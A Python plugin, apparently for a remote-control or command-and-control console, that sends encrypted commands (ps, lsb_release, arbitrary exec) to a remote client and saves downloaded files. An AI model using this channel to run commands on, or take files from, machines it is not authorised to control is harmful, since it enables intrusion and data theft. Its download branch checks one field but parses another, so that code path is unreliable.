import json
import base64
class Plugin:
    def do_test(self, args):
        self.send_command("test")

    def do_info(self, args):
        self.send_command("lsb_release")

    def do_ps(self, args):
        self.send_command("ps")
    
    def do_exec(self,args):
        self.send_command("exec", args)

    def send_command(self, command, data="None"):
        
        payload = {
            "client_id" : self.client,
            "command" : command,
            "data" : data
        }
        msg = self.encrypt_msg(json.dumps(payload), self.aes_secret)
        self.connection['socket'].send(("0"*(16 - len(str(len(msg))))+str(len(msg))).encode() + msg)
        response_len = self.connection['socket'].recv(16)
        response = self.connection['socket'].recv(int(response_len.decode()))
        msg = self.decrypt_msg(response, self.aes_secret)
        if payload["data"] == "download":
            dest = payload["command"].split()[2].split(":")[1]
            src = payload["command"].split()[1].split(":")[1]
            print("Starting Download...")
            with open(dest, "wb") as f:
                f.write(base64.b64decode(msg))
            print("Done!")
        elif len(msg.decode()) > 500:
            with self.console.pager():
                self.console.print(msg.decode())
        else:
            print(msg.decode())